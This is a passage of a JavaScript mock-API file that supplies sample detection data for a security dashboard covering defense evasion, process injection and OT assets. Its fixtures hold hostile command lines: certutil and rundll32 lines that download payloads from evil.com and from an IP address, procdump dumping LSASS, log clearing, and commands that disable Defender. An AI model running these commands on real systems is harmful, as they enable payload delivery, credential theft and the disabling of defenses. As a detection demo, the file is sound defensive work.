AUTHORITY\\SYSTEM', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 4, hostname: 'WS-DEV-03', category: 'file_evasion', technique: 'LOLBin — certutil.exe', mitre_id: 'T1218', severity: 'high', status: 'open', description: 'certutil used to download payload from remote host', process_name: 'certutil.exe', cmdline: 'certutil.exe -urlcache -split -f http://185.220.101.47/p.exe C:\\Windows\\Temp\\p.exe', user_name: 'CORP\\devuser', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 5, hostname: 'WS-ANALYST-02', category: 'credential_evasion', technique: 'LSASS Access', mitre_id: 'T1003.001', severity: 'critical', status: 'open', description: 'powershell.exe accessed lsass.exe with PROCESS_ALL_ACCESS', process_name: 'powershell.exe', cmdline: 'OpenProcess(PROCESS_ALL_ACCESS, lsass.exe)', user_name: 'CORP\\analyst2', created_at: new Date(Date.now() - 600000).toISOString() }, { id: 6, hostname: 'DC-01', category: 'persistence_evasion', technique: 'Hidden Service', mitre_id: 'T1543.003', severity: 'high', status: 'open', description: 'Service created with ServiceType=32 (share process) and random 8-char name to evade detection', process_name: 'sc.exe', cmdline: 'sc create xRt7mKpQ binpath= "C:\\Windows\\Temp\\svc.exe" start= auto', user_name: 'CORP\\admin', created_at: new Date(Date.now() - 3200000).toISOString() }, { id: 7, hostname: 'WS-ANALYST-01', category: 'network_evasion', technique: 'DNS over HTTPS (DoH)', mitre_id: 'T1071.004', severity: 'medium', status: 'open', description: 'Process queried cloudflare-dns.com via HTTPS (DoH) — bypasses corporate DNS monitoring', process_name: 'chrome.exe', cmdline: 'DNS-over-HTTPS query to 1.1.1.1:443', user_name: 'CORP\\jsmith', created_at: new Date(Date.now() - 7200000).toISOString() }]);
  if (p === '/de/behavioral')     return ok({ detections: [{ id: 1, rule: 'Rare Admin Tool — wevtutil.exe', process: 'wevtutil.exe', cmdline: 'wevtutil.exe cl System', severity: 'critical', mitre: 'T1070.001', hostname: 'WS-ANALYST-01', description: 'Event log cleared via wevtutil — indicator of anti-forensics' }, { id: 2, rule: 'Security Process Termination — MsMpEng', process: 'cmd.exe', cmdline: 'taskkill /F /IM MsMpEng.exe', severity: 'critical', mitre: 'T1562.001', hostname: 'DC-01', description: 'Attempt to kill Windows Defender service process' }, { id: 3, rule: 'Multiple Evasion Techniques — PowerShell chain', process: 'powershell.exe', cmdline: 'powershell -nop -enc ... (AMSI bypass + Defender disable + encoded payload)', severity: 'critical', mitre: 'T1027', hostname: 'WS-ANALYST-01', description: 'Three evasion techniques chained: AMSI bypass, Defender disable, encoded command' }, { id: 4, rule: 'LOLBin — certutil.exe', process: 'certutil.exe', cmdline: 'certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\p.exe', severity: 'high', mitre: 'T1218', hostname: 'WS-DEV-03', description: 'certutil used as a downloader — living-off-the-land binary abuse' }, { id: 5, rule: 'Security Tool Enumeration', process: 'powershell.exe', cmdline: "Get-Process | Where-Object {$_.Name -match 'defender|malware|edr|sentinel|crowdstrike'}", severity: 'high', mitre: 'T1518.001', hostname: 'WS-ANALYST-02', description: 'PowerShell enumerating installed security tools before disabling them' }] });
  if (p === '/de/correlation')    return ok([{ id: 1, incident_id: 'INC-2026-0714-001', title: 'Pre-Ransomware Evasion Chain — WS-ANALYST-01', techniques: 'AMSI Bypass, Defender Disable, Log Clearing, Process Hollowing', severity: 'critical', status: 'open', hostname: 'WS-ANALYST-01', created_at: new Date(Date.now() - 3000000).toISOString() }, { id: 2, incident_id: 'INC-2026-0714-002', title: 'Credential Theft Evasion — DC-01', techniques: 'Registry Tamper, Defender Disable, LSASS Access', severity: 'critical', status: 'investigating', hostname: 'DC-01', created_at: new Date(Date.now() - 2700000).toISOString() }, { id: 3, incident_id: 'INC-2026-0714-003', title: 'LOLBin Download + Execution — WS-DEV-03', techniques: 'certutil download, Process Hollowing, Service Install', severity: 'high', status: 'open', hostname: 'WS-DEV-03', created_at: new Date(Date.now() - 900000).toISOString() }]);
  if (p === '/de/mitre')          return ok({ tactic: { id: 'TA0005', name: 'Defense Evasion' }, techniques: [{ id: 'T1027', name: 'Obfuscated Files or Information', sub_techniques: [{ id: 'T1027.001', name: 'Binary Padding', detected: false, count: 0 }, { id: 'T1027.002', name: 'Software Packing', detected: true, count: 2 }, { id: 'T1027.010', name: 'Command Obfuscation', detected: true, count: 5 }], detected: true, count: 7, severity: 'high' }, { id: 'T1036', name: 'Masquerading', sub_techniques: [{ id: 'T1036.003', name: 'Rename System Utilities', detected: true, count: 2 }, { id: 'T1036.005', name: 'Match Legitimate Name or Location', detected: true, count: 3 }], detected: true, count: 5, severity: 'high' }, { id: 'T1055', name: 'Process Injection', sub_techniques: [{ id: 'T1055.001', name: 'DLL Injection', detected: true, count: 3 }, { id: 'T1055.012', name: 'Process Hollowing', detected: true, count: 4 }], detected: true, count: 7, severity: 'critical' }, { id: 'T1070', name: 'Indicator Removal', sub_techniques: [{ id: 'T1070.001', name: 'Clear Windows Event Logs', detected: true, count: 2 }, { id: 'T1070.003', name: 'Clear Command History', detected: true, count: 1 }, { id: 'T1070.004', name: 'File Deletion', detected: false, count: 0 }], detected: true, count: 3, severity: 'critical' }, { id: 'T1112', name: 'Modify Registry', sub_techniques: [], detected: true, count: 4, severity: 'high' }, { id: 'T1218', name: 'System Binary Proxy Execution', sub_techniques: [{ id: 'T1218.005', name: 'Mshta', detected: true, count: 1 }, { id: 'T1218.011', name: 'Rundll32', detected: true, count: 2 }], detected: true, count: 3, severity: 'high' }, { id: 'T1562', name: 'Impair Defenses', sub_techniques: [{ id: 'T1562.001', name: 'Disable or Modify Tools', detected: true, count: 3 }, { id: 'T1562.002', name: 'Disable Windows Event Logging', detected: true, count: 2 }, { id: 'T1562.004', name: 'Disable or Modify System Firewall', detected: true, count: 1 }, { id: 'T1562.006', name: 'Indicator Blocking', detected: false, count: 0 }], detected: true, count: 6, severity: 'critical' }, { id: 'T1134', name: 'Access Token Manipulation', sub_techniques: [{ id: 'T1134.001', name: 'Token Impersonation/Theft', detected: false, count: 0 }], detected: false, count: 0, severity: 'high' }, { id: 'T1497', name: 'Virtualization/Sandbox Evasion', sub_techniques: [{ id: 'T1497.001', name: 'System Checks', detected: false, count: 0 }], detected: false, count: 0, severity: 'medium' }] });
  if (p === '/de/threat-intel')   return ok({ malware_families: [{ name: 'Cobalt Strike', evasion_techniques: ['AMSI Bypass', 'Process Hollowing', 'Log Clearing', 'Encoded Commands'], confidence: 94, ioc_matches: 3 }, { name: 'Emotet', evasion_techniques: ['PowerShell Obfuscation', 'Registry Autorun', 'LOLBins — msiexec'], confidence: 82, ioc_matches: 1 }, { name: 'BlackCat/ALPHV', evasion_techniques: ['Defender Disable', 'VSS Deletion', 'Event Log Clearing'], confidence: 71, ioc_matches: 2 }], threat_actors: [{ name: 'APT29 (Cozy Bear)', known_techniques: ['T1562.001', 'T1070.001', 'T1027.010', 'T1218.011'], targets: 'Government, Defence' }, { name: 'FIN7', known_techniques: ['T1027', 'T1036.005', 'T1218', 'T1562'], targets: 'Finance, Hospitality' }, { name: 'Lazarus Group', known_techniques: ['T1070', 'T1055', 'T1562.001', 'T1036'], targets: 'Crypto, Finance' }], campaigns: [{ name: 'Operation CloudHopper', actor: 'APT10', technique: 'Log clearing + AMSI bypass + PowerShell obfuscation', detected: new Date(Date.now() - 172800000).toISOString() }, { name: 'Ransomware Pre-Stage', actor: 'Unknown', technique: 'Defender disable → shadow copy deletion → log wipe', detected: new Date(Date.now() - 21600000).toISOString() }], ioc_matches: [{ type: 'sha256', value: '3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f', family: 'Cobalt Strike', context: 'unsigned binary loaded by rundll32.exe' }, { type: 'registry_key', value: 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware', family: 'Generic Defender Disabler', context: 'set to 1 by powershell.exe' }] });
  if (p === '/de/timeline')       return ok([{ id: 1, hostname: 'WS-ANALYST-01', technique: 'AMSI Bypass', mitre_id: 'T1562.001', severity: 'critical', status: 'open', description: 'PowerShell patched AMSI.dll AmsiScanBuffer to return AMSI_RESULT_CLEAN via reflection', process_name: 'powershell.exe', cmdline: 'powershell.exe -nop -enc SQBFAF...', created_at: new Date(Date.now() - 3800000).toISOString() }, { id: 2, hostname: 'WS-ANALYST-01', technique: 'Defender Disable', mitre_id: 'T1562.001', severity: 'critical', status: 'open', description: 'Windows Defender real-time monitoring disabled via Set-MpPreference', process_name: 'powershell.exe', cmdline: 'Set-MpPreference -DisableRealtimeMonitoring $true', created_at: new Date(Date.now() - 3700000).toISOString() }, { id: 3, hostname: 'WS-ANALYST-01', technique: 'Event Log Clearing', mitre_id: 'T1070.001', severity: 'critical', status: 'open', description: 'Security and System event logs cleared via wevtutil.exe', process_name: 'wevtutil.exe', cmdline: 'wevtutil.exe cl Security && wevtutil.exe cl System', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 4, hostname: 'WS-ANALYST-01', technique: 'Process Hollowing', mitre_id: 'T1055.012', severity: 'critical', status: 'open', description: 'Cobalt Strike beacon hollowed into explorer.exe after log clearing', process_name: 'explorer.exe', cmdline: 'C:\\Windows\\Explorer.EXE', created_at: new Date(Date.now() - 3500000).toISOString() }, { id: 5, hostname: 'DC-01', technique: 'Registry Tamper', mitre_id: 'T1112', severity: 'critical', status: 'open', description: 'Defender disabled via registry key modification on DC-01', process_name: 'reg.exe', cmdline: 'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1', created_at: new Date(Date.now() - 2700000).toISOString() }]);
  if (p === '/de/analytics')      return ok({ evasion_trend: [{ date: '2026-07-09', count: 1 }, { date: '2026-07-10', count: 0 }, { date: '2026-07-11', count: 2 }, { date: '2026-07-12', count: 1 }, { date: '2026-07-13', count: 3 }, { date: '2026-07-14', count: 4 }, { date: '2026-07-15', count: 5 }, { date: '2026-07-16', count: 9 }], top_techniques: [{ technique: 'AMSI Bypass', count: 7, severity: 'critical' }, { technique: 'Event Log Clearing', count: 5, severity: 'critical' }, { technique: 'PowerShell Obfuscation', count: 6, severity: 'high' }, { technique: 'Defender Disable', count: 4, severity: 'critical' }, { technique: 'Process Hollowing', count: 4, severity: 'critical' }, { technique: 'LOLBin Abuse', count: 3, severity: 'high' }], most_targeted_endpoints: [{ hostname: 'WS-ANALYST-01', event_count: 9, risk: 94 }, { hostname: 'DC-01', event_count: 6, risk: 91 }, { hostname: 'WS-DEV-03', event_count: 4, risk: 76 }, { hostname: 'WS-ANALYST-02', event_count: 3, risk: 68 }], control_status: [{ control: 'Windows Defender', status: 'degraded', coverage: 60 }, { control: 'EDR Agent', status: 'active', coverage: 95 }, { control: 'Firewall', status: 'active', coverage: 88 }, { control: 'Sysmon', status: 'active', coverage: 92 }, { control: 'Audit Logging', status: 'degraded', coverage: 55 }, { control: 'AMSI', status: 'tampered', coverage: 20 }], mitre_coverage: 72 });
  if (p === '/de/validation')     return ok({ detection_success_rate: 83, missed_attempts: 4, false_positives: 2, avg_time_to_detect_seconds: 38, coverage_by_platform: [{ platform: 'Windows', coverage: 88 }, { platform: 'Linux', coverage: 71 }, { platform: 'macOS', coverage: 62 }, { platform: 'Container', coverage: 55 }, { platform: 'Cloud', coverage: 48 }], technique_coverage: [{ category: 'Log Evasion', covered: 5, total: 6 }, { category: 'Process Evasion', covered: 4, total: 7 }, { category: 'Script Evasion', covered: 6, total: 7 }, { category: 'Tamper Detection', covered: 8, total: 9 }, { category: 'Network Evasion', covered: 4, total: 7 }] });

  // ── Process Injection Enterprise ──────────────────────────────────────────
  if (p === '/pi/dashboard')    return ok({ injection_alerts: 6, active_injections: 4, suspicious_processes: 12, protected_processes: 38, memory_modifications: 8, high_risk_hosts: 3, detection_coverage: 75, injection_types: ['DLL Injection', 'Process Hollowing', 'APC Injection', 'Thread Injection', 'Reflective DLL Loading', 'Manual Mapping', 'AtomBombing', 'Process Doppelgänging', 'Process Ghosting', 'Early Bird APC', 'Thread Hijacking', 'QueueUserAPC Abuse'] });
  if (p === '/pi/processes')    return ok([{ id: 1, agent_id: 'a1', hostname: 'WS-ANALYST-01', name: 'WINWORD.EXE', pid: 8832, ppid: 4512, username: 'CORP\\jsmith', cmdline: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\jsmith\\Desktop\\Q4_Report.docx"', path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', signature: 'Microsoft Corporation', sha256: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', integrity_level: 'Medium', start_time: new Date(Date.now() - 3600000).toISOString(), risk_score: 91, created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, agent_id: 'a1', hostname: 'WS-ANALYST-01', name: 'powershell.exe', pid: 7142, ppid: 8832, username: 'CORP\\jsmith', cmdline: 'powershell.exe -nop -enc SQBFAF...', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', signature: 'Microsoft Corporation', sha256: 'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3', integrity_level: 'High', start_time: new Date(Date.now() - 3300000).toISOString(), risk_score: 97, created_at: new Date(Date.now() - 3300000).toISOString() }, { id: 3, agent_id: 'a1', hostname: 'WS-ANALYST-01', name: 'explorer.exe', pid: 4512, ppid: 1040, username: 'CORP\\jsmith', cmdline: 'C:\\Windows\\Explorer.EXE', path: 'C:\\Windows\\Explorer.EXE', signature: 'Microsoft Corporation', sha256: 'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', integrity_level: 'Medium', start_time: new Date(Date.now() - 28800000).toISOString(), risk_score: 88, created_at: new Date(Date.now() - 28800000).toISOString() }, { id: 4, agent_id: 'a2', hostname: 'DC-01', name: 'lsass.exe', pid: 2388, ppid: 712, username: 'NT AUTHORITY\\SYSTEM', cmdline: 'C:\\Windows\\system32\\lsass.exe', path: 'C:\\Windows\\system32\\lsass.exe', signature: 'Microsoft Corporation', sha256: 'd4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5', integrity_level: 'System', start_time: new Date(Date.now() - 172800000).toISOString(), risk_score: 78, created_at: new Date(Date.now() - 172800000).toISOString() }]);
  if (p === '/pi/process-tree') return ok([{ id: 1, name: 'System', pid: 4, ppid: 0, username: 'NT AUTHORITY\\SYSTEM', cmdline: '', risk_score: 0, children: [1040] }, { id: 2, name: 'smss.exe', pid: 712, ppid: 4, username: 'NT AUTHORITY\\SYSTEM', cmdline: '\\SystemRoot\\System32\\smss.exe', risk_score: 0, children: [] }, { id: 3, name: 'csrss.exe', pid: 1040, ppid: 712, username: 'NT AUTHORITY\\SYSTEM', cmdline: '%SystemRoot%\\system32\\csrss.exe', risk_score: 0, children: [4512] }, { id: 4, name: 'explorer.exe', pid: 4512, ppid: 1040, username: 'CORP\\jsmith', cmdline: 'C:\\Windows\\Explorer.EXE', risk_score: 88, children: [8832] }, { id: 5, name: 'WINWORD.EXE', pid: 8832, ppid: 4512, username: 'CORP\\jsmith', cmdline: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\jsmith\\Desktop\\Q4_Report.docx"', risk_score: 91, children: [7142] }, { id: 6, name: 'powershell.exe', pid: 7142, ppid: 8832, username: 'CORP\\jsmith', cmdline: 'powershell.exe -nop -enc SQBFAF...', risk_score: 97, children: [] }]);
  if (p === '/pi/injections')   return ok({ injections: [{ id: 1, src_pid: 7142, src_name: 'powershell.exe', dst_pid: 4512, dst_name: 'explorer.exe', technique: 'Process Hollowing', api_call: 'NtUnmapViewOfSection + NtWriteVirtualMemory', hostname: 'WS-ANALYST-01', sha256: '3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f', severity: 'critical', status: 'open', mitre_technique: 'T1055.012', created_at: new Date(Date.now() - 3000000).toISOString() }, { id: 2, src_pid: 7142, src_name: 'powershell.exe', dst_pid: 2388, dst_name: 'lsass.exe', technique: 'Process Access', api_call: 'OpenProcess(PROCESS_ALL_ACCESS)', hostname: 'DC-01', sha256: '1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d', severity: 'critical', status: 'open', mitre_technique: 'T1003.001', created_at: new Date(Date.now() - 2700000).toISOString() }, { id: 3, src_pid: 8832, src_name: 'WINWORD.EXE', dst_pid: 7142, dst_name: 'powershell.exe', technique: 'APC Injection', api_call: 'QueueUserAPC', hostname: 'WS-ANALYST-01', sha256: '7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b', severity: 'high', status: 'investigating', mitre_technique: 'T1055.004', created_at: new Date(Date.now() - 2400000).toISOString() }, { id: 4, src_pid: 7142, src_name: 'powershell.exe', dst_pid: 9021, dst_name: 'svchost.exe', technique: 'Reflective DLL Loading', api_call: 'VirtualAllocEx + WriteProcessMemory + CreateRemoteThread', hostname: 'WS-DEV-03', sha256: 'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6', severity: 'high', status: 'open', mitre_technique: 'T1055', created_at: new Date(Date.now() - 1800000).toISOString() }], total: 6, critical: 3 });
  if (p === '/pi/memory')       return ok({ regions: [{ id: 1, pid: 4512, process_name: 'explorer.exe', hostname: 'WS-ANALYST-01', region_type: 'hollow_section', base_addr: '0x0000022000000000', size_bytes: 1048576, protection: 'RWX', is_executable: true, is_suspicious: true, entropy: 7.82, contains_shellcode: true, is_backed: false, created_at: new Date(Date.now() - 3000000).toISOString() }, { id: 2, pid: 4512, process_name: 'explorer.exe', hostname: 'WS-ANALYST-01', region_type: 'injected_dll', base_addr: '0x00007FF000000000', size_bytes: 65536, protection: 'RWX', is_executable: true, is_suspicious: true, entropy: 6.54, contains_shellcode: false, is_backed: false, created_at: new Date(Date.now() - 2900000).toISOString() }, { id: 3, pid: 7142, process_name: 'powershell.exe', hostname: 'WS-ANALYST-01', region_type: 'heap_spray', base_addr: '0x0000020000000000', size_bytes: 4096, protection: 'RWX', is_executable: true, is_suspicious: true, entropy: 7.12, contains_shellcode: true, is_backed: false, created_at: new Date(Date.now() - 2700000).toISOString() }], rwx_pages: 8, shellcode: 3, unbacked: 5 });
  if (p === '/pi/modules')      return ok({ modules: [{ pid: 4512, process: 'explorer.exe', name: 'kernel32.dll', path: 'C:\\Windows\\System32\\kernel32.dll', signed: true, vendor: 'Microsoft', base_addr: '0x7FFF80000000', size: 786432 }, { pid: 4512, process: 'explorer.exe', name: 'ntdll.dll', path: 'C:\\Windows\\System32\\ntdll.dll', signed: true, vendor: 'Microsoft', base_addr: '0x7FFFC0000000', size: 2097152 }, { pid: 4512, process: 'explorer.exe', name: 'injected.dll', path: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\injected.dll', signed: false, vendor: 'Unknown', base_addr: '0x00007FF000000000', size: 65536, suspicious: true }, { pid: 4512, process: 'explorer.exe', name: '[hidden module]', path: '', signed: false, vendor: 'Unknown', base_addr: '0x0000022000000000', size: 32768, suspicious: true, hidden: true }, { pid: 2388, process: 'lsass.exe', name: 'wdigest.dll', path: 'C:\\Windows\\System32\\wdigest.dll', signed: true, vendor: 'Microsoft', base_addr: '0x7FFF70000000', size: 262144 }] });
  if (p === '/pi/handles')      return ok({ handles: [{ pid: 7142, process: 'powershell.exe', handle_type: 'Process', target_pid: 2388, target: 'lsass.exe', access: 'PROCESS_ALL_ACCESS', suspicious: true, reason: 'Process handle to LSASS with PROCESS_ALL_ACCESS — credential dumping indicator' }, { pid: 7142, process: 'powershell.exe', handle_type: 'Process', target_pid: 4512, target: 'explorer.exe', access: 'PROCESS_VM_WRITE|PROCESS_VM_OPERATION', suspicious: true, reason: 'Write access to explorer.exe — process injection setup' }, { pid: 8832, process: 'WINWORD.EXE', handle_type: 'Process', target_pid: 7142, target: 'powershell.exe', access: 'PROCESS_CREATE_THREAD|PROCESS_VM_WRITE', suspicious: true, reason: 'Office process with thread creation rights to PowerShell — macro execution pattern' }] });
  if (p === '/pi/api-calls')    return ok({ api_calls: [{ id: 1, pid: 7142, process_name: 'powershell.exe', target_pid: 4512, api_name: 'VirtualAllocEx', parameters: 'hProcess=0x1c4, lpAddress=NULL, dwSize=0x100000, flAllocationType=MEM_COMMIT|MEM_RESERVE, flProtect=PAGE_EXECUTE_READWRITE', hostname: 'WS-ANALYST-01', is_suspicious: true, created_at: new Date(Date.now() - 3100000).toISOString() }, { id: 2, pid: 7142, process_name: 'powershell.exe', target_pid: 4512, api_name: 'WriteProcessMemory', parameters: 'hProcess=0x1c4, lpBaseAddress=0x0000022000000000, lpBuffer=[Cobalt Strike PE], nSize=0x100000', hostname: 'WS-ANALYST-01', is_suspicious: true, created_at: new Date(Date.now() - 3050000).toISOString() }, { id: 3, pid: 7142, process_name: 'powershell.exe', target_pid: 4512, api_name: 'NtUnmapViewOfSection', parameters: 'ProcessHandle=0x1c4, BaseAddress=0x00007FF780000000', hostname: 'WS-ANALYST-01', is_suspicious: true, created_at: new Date(Date.now() - 3080000).toISOString() }, { id: 4, pid: 7142, process_name: 'powershell.exe', target_pid: 4512, api_name: 'CreateRemoteThread', parameters: 'hProcess=0x1c4, lpStartAddress=0x0000022000000000, lpParameter=0x0', hostname: 'WS-ANALYST-01', is_suspicious: true, created_at: new Date(Date.now() - 3000000).toISOString() }, { id: 5, pid: 8832, process_name: 'WINWORD.EXE', target_pid: 7142, api_name: 'QueueUserAPC', parameters: 'pfnAPC=0x7FFF50000000, hThread=0x2a8, dwData=0', hostname: 'WS-ANALYST-01', is_suspicious: true, created_at: new Date(Date.now() - 3200000).toISOString() }], monitored_apis: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'NtMapViewOfSection', 'NtWriteVirtualMemory', 'QueueUserAPC', 'SetWindowsHookEx', 'NtCreateThreadEx', 'RtlCreateUserThread', 'NtUnmapViewOfSection', 'VirtualProtectEx', 'LoadLibraryA'] });
  if (p === '/pi/behavioral')   return ok({ detections: [{ id: 1, rule: 'Office → PowerShell', parent: 'WINWORD.EXE', child: 'powershell.exe', cmdline: 'powershell.exe -nop -enc SQBFAF...', severity: 'critical', mitre: 'T1059.001', hostname: 'WS-ANALYST-01' }, { id: 2, rule: 'LSASS Access', parent: 'powershell.exe', child: 'lsass.exe', cmdline: 'OpenProcess(PROCESS_ALL_ACCESS, lsass.exe)', severity: 'critical', mitre: 'T1003.001', hostname: 'DC-01' }, { id: 3, rule: 'LOLBin — rundll32', parent: 'cmd.exe', child: 'rundll32.exe', cmdline: 'rundll32.exe javascript:"..mshtml,RunHTMLApplication ";document.write();GetObject("script:http://evil.com/payload.sct")', severity: 'high', mitre: 'T1218.011', hostname: 'WS-DEV-03' }, { id: 4, rule: 'Credential Dumping — procdump', parent: 'cmd.exe', child: 'procdump.exe', cmdline: 'procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp', severity: 'critical', mitre: 'T1003.001', hostname: 'DC-01' }] });
  if (p === '/pi/threat-intel') return ok({ malware_matches: [{ sha256: '3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f', name: 'Cobalt Strike Beacon', family: 'cobalt_strike', confidence: 97, injection_type: 'Process Hollowing', target: 'explorer.exe' }, { sha256: '1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d', name: 'Mimikatz', family: 'credential_theft', confidence: 99, injection_type: 'Process Access', target: 'lsass.exe' }], threat_actors: [{ name: 'Lazarus Group', ttps: ['Process Hollowing', 'APC Injection', 'Reflective DLL Loading'], targets: 'Finance, Crypto' }, { name: 'APT29 (Cozy Bear)', ttps: ['Process Ghosting', 'NtMapViewOfSection', 'Early Bird APC'], targets: 'Government, Defense' }, { name: 'FIN7', ttps: ['DLL Injection', 'Reflective DLL Loading', 'AtomBombing'], targets: 'Retail, Finance, Hospitality' }], campaigns: [{ name: 'Operation DustySky', actor: 'APT29', technique: 'Process Ghosting via NTFS transactions', detected: new Date(Date.now() - 259200000).toISOString() }, { name: 'Cobalt Strike Campaign', actor: 'Unknown', technique: 'Process Hollowing into svchost.exe', detected: new Date(Date.now() - 86400000).toISOString() }] });
  if (p === '/pi/timeline')     return ok([{ id: 1, title: 'Process Hollowing Detected — explorer.exe', description: 'Cobalt Strike beacon hollowed into explorer.exe (PID 4512) from powershell.exe (PID 7142). PE header at 0x0000022000000000, entropy 7.82.', technique: 'Process Hollowing', severity: 'critical', mitre_technique: 'T1055.012', hostname: 'WS-ANALYST-01', status: 'open', created_at: new Date(Date.now() - 3000000).toISOString() }, { id: 2, title: 'LSASS Process Handle — PROCESS_ALL_ACCESS', description: 'powershell.exe (PID 7142) opened LSASS (PID 2388) with PROCESS_ALL_ACCESS. Mimikatz pattern confirmed.', technique: 'Process Access', severity: 'critical', mitre_technique: 'T1003.001', hostname: 'DC-01', status: 'open', created_at: new Date(Date.now() - 2700000).toISOString() }, { id: 3, title: 'Malicious Macro Spawned PowerShell', description: 'WINWORD.EXE (PID 8832) spawned powershell.exe with -nop -enc flags. Encoded payload decodes to Cobalt Strike stager.', technique: 'APC Injection', severity: 'high', mitre_technique: 'T1059.001', hostname: 'WS-ANALYST-01', status: 'investigating', created_at: new Date(Date.now() - 3400000).toISOString() }]);
  if (p === '/pi/mitre')        return ok({ parent: { technique_id: 'T1055', name: 'Process Injection', tactic: 'Defense Evasion, Privilege Escalation', url: 'https://attack.mitre.org/techniques/T1055/' }, sub_techniques: [{ id: 'T1055.001', name: 'Dynamic-link Library Injection', detected: true, count: 3 }, { id: 'T1055.002', name: 'Portable Executable Injection', detected: false, count: 0 }, { id: 'T1055.003', name: 'Thread Execution Hijacking', detected: true, count: 1 }, { id: 'T1055.004', name: 'Asynchronous Procedure Call', detected: true, count: 2 }, { id: 'T1055.005', name: 'Thread Local Storage', detected: false, count: 0 }, { id: 'T1055.012', name: 'Process Hollowing', detected: true, count: 4 }, { id: 'T1055.013', name: 'Process Doppelgänging', detected: false, count: 0 }], related: [{ id: 'T1003.001', name: 'LSASS Memory', tactic: 'Credential Access', detected: true }, { id: 'T1059.001', name: 'PowerShell', tactic: 'Execution', detected: true }, { id: 'T1218.011', name: 'Rundll32', tactic: 'Defense Evasion', detected: true }, { id: 'T1134', name: 'Access Token Manipulation', tactic: 'Privilege Escalation', detected: false }] });
  if (p === '/pi/analytics')    return ok({ injection_trend: [{ date: '2026-07-09', count: 0 }, { date: '2026-07-10', count: 1 }, { date: '2026-07-11', count: 0 }, { date: '2026-07-12', count: 2 }, { date: '2026-07-13', count: 1 }, { date: '2026-07-14', count: 3 }, { date: '2026-07-15', count: 2 }, { date: '2026-07-16', count: 6 }], top_techniques: [{ technique: 'Process Hollowing', count: 4, severity: 'critical' }, { technique: 'DLL Injection', count: 3, severity: 'high' }, { technique: 'APC Injection', count: 2, severity: 'high' }, { technique: 'Reflective DLL Loading', count: 2, severity: 'critical' }], most_targeted_processes: [{ process: 'explorer.exe', count: 5, risk: 'critical' }, { process: 'lsass.exe', count: 3, risk: 'critical' }, { process: 'svchost.exe', count: 4, risk: 'high' }, { process: 'notepad.exe', count: 2, risk: 'medium' }], most_used_apis: [{ api: 'VirtualAllocEx', count: 12 }, { api: 'WriteProcessMemory', count: 11 }, { api: 'CreateRemoteThread', count: 7 }, { api: 'NtMapViewOfSection', count: 4 }, { api: 'QueueUserAPC', count: 3 }], high_risk_hosts: [{ hostname: 'WS-ANALYST-01', injection_count: 6, risk: 91 }, { hostname: 'DC-01', injection_count: 3, risk: 88 }, { hostname: 'WS-DEV-03', injection_count: 2, risk: 72 }] });

  // ── OT/ICS Security Enterprise ────────────────────────────────────────────
  if (p === '/ot/dashboard')      return ok({ sites: 3, industrial_zones: 8, plcs: 12, hmis: 6, rtus: 9, engineering_workstations: 4, scada_servers: 2, total_assets: 47, ot_risk_score: 74, critical_alerts: 6, active_incidents: 2, network_health: 82 });
  if (p === '/ot/assets')         return ok([{ id: 1, name: 'PLC-UNIT-01', asset_type: 'plc', vendor: 'Siemens', model: 'S7-315-2DP', firmware: '3.3.12', ip: '10.10.1.10', mac: '00:1B:1B:AA:BB:CC', zone: 'Production Cell A', site: 'Site-Alpha', purdue_level: 1, criticality: 'critical', risk_score: 88, is_online: true, uptime_hours: 4320, last_seen: new Date(Date.now() - 30000).toISOString(), created_at: '2019-03-01T00:00:00Z' }, { id: 2, name: 'HMI-CONTROL-01', asset_type: 'hmi', vendor: 'Wonderware', model: 'InTouch 2014', firmware: 'Win7-SP1', ip: '10.10.1.20', mac: '00:1B:1B:CC:DD:EE', zone: 'Control Room', site: 'Site-Alpha', purdue_level: 2, criticality: 'critical', risk_score: 82, is_online: true, uptime_hours: 8760, last_seen: new Date(Date.now() - 60000).toISOString(), created_at: '2014-06-15T00:00:00Z' }, { id: 3, name: 'RTU-FIELD-03', asset_type: 'rtu', vendor: 'SEL', model: 'SEL-2411', firmware: '1.2.4', ip: '10.10.1.33', mac: '00:30:A7:11:22:33', zone: 'Field Zone 3', site: 'Site-Beta', purdue_level: 1, criticality: 'high', risk_score: 71, is_online: true, uptime_hours: 17520, last_seen: new Date(Date.now() - 120000).toISOString(), created_at: '2017-09-10T00:00:00Z' }, { id: 4, name: 'EWS-SIEMENS-01', asset_type: 'engineering_workstation', vendor: 'Siemens', model: 'SIMATIC PG M6', firmware: 'Win10-21H2', ip: '10.10.0.5', mac: '00:1B:21:AA:11:22', zone: 'Engineering', site: 'Site-Alpha', purdue_level: 2, criticality: 'high', risk_score: 76, is_online: 